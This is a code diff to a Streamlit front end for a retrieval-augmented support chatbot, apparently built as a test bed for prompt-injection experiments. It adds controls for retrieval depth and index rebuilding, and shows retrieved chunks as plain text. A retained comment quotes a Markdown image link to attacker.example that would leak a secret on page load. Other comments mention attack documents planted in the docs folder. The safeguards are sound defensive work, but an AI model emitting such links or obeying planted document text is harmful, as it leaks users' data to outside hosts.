@@ -5,16 +5,33 @@ Run with: streamlit run app.py
 
 import streamlit as st
 
-from rag import EXPECTED_ERRORS, answer
+from rag import EXPECTED_ERRORS, answer, retrieved_files
+from vectorstore import TOP_K, build_index
 
 # Page text: change these to reword the UI.
 PAGE_TITLE = "Northwind Gadgets Support"
 PAGE_CAPTION = "Ask questions about Northwind's policies. Answers come from the company docs."
 ERROR_MESSAGE = "Couldn't answer this question."  # details are shown below it as plain text
+CHUNKS_LABEL = "Retrieved chunks (what the model saw)"
+MAX_K = 10  # upper end of the k slider
 
 st.set_page_config(page_title=PAGE_TITLE)
 st.title(PAGE_TITLE)
 st.caption(PAGE_CAPTION)
+
+# Sidebar: debugging controls for the attack experiments.
+with st.sidebar:
+    k = st.slider("Chunks to retrieve (k)", min_value=1, max_value=MAX_K, value=TOP_K)
+    # Rebuild after adding, editing or removing files in docs/.
+    if st.button("Rebuild index"):
+        try:
+            with st.spinner("Rebuilding..."):
+                count = build_index()
+        except EXPECTED_ERRORS as error:
+            st.error("Rebuild failed.")
+            st.text(str(error))
+        else:
+            st.success(f"Indexed {count} chunks.")
 
 # Streamlit reruns this whole script on every interaction, so normal variables
 # reset each time. session_state survives reruns, so the chat history lives there.
@@ -31,6 +48,15 @@ def show(message: dict) -> None:
         # ![](https://attacker.example/?code=SECRET) make the browser load
         # that URL automatically, leaking data without a click.
         st.text(message["content"])
+
+        # File names and chunk text come from docs/, where attack documents will
+        # be planted, so they are shown as plain text too (st.text / st.code).
+        if chunks := message.get("chunks"):
+            st.text(f"Retrieved files: {', '.join(retrieved_files(chunks))}")
+            with st.expander(CHUNKS_LABEL):  # expander labels parse Markdown: fixed text only
+                for chunk in chunks:
+                    st.text(f"{chunk['source']} #{chunk['chunk_index']} · distance {chunk['distance']:.3f}")
+                    st.code(chunk["text"], language=None, wrap_lines=True)
 
 
 def add(message: dict) -> None:
@@ -49,8 +75,9 @@ if question := st.chat_input("Ask about Northwind Gadgets"):
     try:
         with st.spinner("Thinking..."):
             # Each question is answered on its own: the model doesn't see the history.
-            text, _retrieved_files = answer(question)  # files are shown in #6
+            text, chunks = answer(question, k)
     except EXPECTED_ERRORS as error:
         add({"role": "assistant", "content": f"Error: {error}", "error": True})
     else:
-        add({"role": "assistant", "content": text})
+        # Save the chunks with the answer, so its panel survives redraws.
+        add({"role": "assistant", "content": text, "chunks": chunks})
